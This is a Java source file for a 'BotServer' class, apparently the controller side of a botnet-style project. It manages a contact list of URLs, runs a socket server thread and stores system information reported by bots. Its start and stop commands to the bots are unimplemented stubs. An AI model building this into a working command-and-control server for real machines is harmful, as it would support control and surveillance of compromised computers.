package control.server;

import java.net.NetworkInterface;
import java.net.SocketException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Enumeration;
import control.Config;
import control.client.ContactThread;
import control.client.Log;
import model.BotStatus;
import model.SystemInfo;
import model.SystemInfoEntry;
import model.URLEntry;
import model.gui.SystemInfoEntryProperty;
import model.gui.URLEntryProperty;



public class BotServer {
	String botServerId;
	BotStatus status;
	ArrayList<URLEntry> contactsList;
	SocketBotServerThread socketBotServerThread;
	Config config;
	Log log;
	ProgramLog programLog;
	
	SystemInfoBotServer systemInfoBotServer;

	ArrayList<ContactThread> contactThreadList;

	Path prjDirPath, dataDirPath, configFilePath, logFilePath, sysInfoFilePath, botServerDirPath;		

	public BotServer() {
		botServerId = generateID();
		status = BotStatus.IDLE;
		contactsList = new ArrayList<URLEntry>();
	}
	
	private String generateID() {
		String macAdd = getMacAddress();
        macAdd = macAdd.replace("-", "");
        char[] macAddChars = macAdd.toCharArray();
        Arrays.sort(macAddChars);        
        String macAddSorted = new String(macAddChars);
		return  macAddSorted;
	}

	private String getMacAddress() {
		String returnValue = null;
		try {
			Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();

			for (NetworkInterface networkInterface : Collections.list(networkInterfaces)){
		
				byte[] mac = networkInterface.getHardwareAddress();

				if(mac==null){
					continue;
				}

				StringBuilder sb = new StringBuilder();
				for (int j = 0; j < mac.length; j++) {
					sb.append(String.format("%02X%s", mac[j], (j < mac.length - 1) ? "-" : ""));
				}
				returnValue = sb.toString();
				
				break;
			}
				
		} catch (SocketException e) {
			e.printStackTrace();
		}
				return returnValue;
	}

	public String getBotServerId() {
		return botServerId;
	}
	public void setBotServerId(String id) {
		this.botServerId = id;
	}
	public BotStatus getStatus() {
		return status;
	}
	public void setStatus(BotStatus status) {
		this.status = status;
	}
	public ArrayList<URLEntry> getContactsList() {
		return contactsList;
	}
	public void setContactsList(ArrayList<URLEntry> contactsList) {
		this.contactsList = contactsList;
	}

	public void init() {

		prjDirPath = Paths.get(System.getProperty("user.dir"));
		dataDirPath = prjDirPath.resolve("data");
		botServerDirPath = dataDirPath.resolve("botmaster");
		configFilePath = botServerDirPath.resolve("config.txt");
		logFilePath = botServerDirPath.resolve("log.txt");
		sysInfoFilePath = botServerDirPath.resolve("sysinfo.txt");

		config = new Config(configFilePath);
		log = new Log(logFilePath);
		programLog = ProgramLog.getProgramLog();
		systemInfoBotServer = new SystemInfoBotServer(sysInfoFilePath);
		
		contactsList = config.readFile(configFilePath);
		
		log.openOrCreateLogFile();
		programLog.addInfo("Program Started");
		

		systemInfoBotServer.openOrCreateSystemInfoFile();
		systemInfoBotServer.readFile();
		
		
		socketBotServerThread = new SocketBotServerThread();
		Thread t = new Thread(socketBotServerThread);
		t.start();
		

		
		
	}

	public void close() {

		
		systemInfoBotServer.writeFile();

		socketBotServerThread.interrupt();

		config.writeFile(configFilePath, contactsList);
	}

	public void start() {
		/*TODO 		/*il server invia il comando di start ai bot*/
	}

	public void stop() {
		/*TODO 		/*il server invia il comando di stop ai bot*/
	}
	
	public void pause() {
		/*TODO*/
	}

	public void resume() {
		/*TODO*/
	}
	
	public ArrayList<URLEntry> getContactList(){
		return this.contactsList;
	};
	
	public ArrayList<URLEntryProperty> getContactsListProperty() {
		ArrayList<URLEntryProperty> returnValue = new ArrayList<URLEntryProperty>();
		
		for (int i = 0; i < contactsList.size(); i++) {
			returnValue.add(new URLEntryProperty(contactsList.get(i)));
		}

		return returnValue;
	}

	public URLEntry addContact(URLEntry newUrlEntry) {
		int lastContactId = 0;
		if(!contactsList.isEmpty()){
			lastContactId = contactsList.get(contactsList.size()-1).getID();
		}
		newUrlEntry.setID(lastContactId+1);
		this.contactsList.add(newUrlEntry);
		return newUrlEntry;
	}

	public void removeContact(Integer id) {
		for (int i = 0; i < contactsList.size(); i++) {
			if(contactsList.get(i).getID().equals(id)){
				contactsList.remove(i);
			}
		}
	}

	public void editContact(URLEntry newUrlEntry) {
		int i;
		for (i = 0; i < contactsList.size(); i++) {
			if(contactsList.get(i).getID()==newUrlEntry.getID()){
				break;
			}
		}
		contactsList.set(i, newUrlEntry);
	}

	public void addSystemInfo(ArrayList<SystemInfoEntry> inSystemInfo) {
		systemInfoBotServer.addSystemInfo(new SystemInfo(inSystemInfo));
		
	}

	
	public ArrayList<SystemInfoEntryProperty> getSystemInfoProperty(int selectedIndex) {
		return systemInfoBotServer.getSystemInfoProperty(selectedIndex);
	}
}
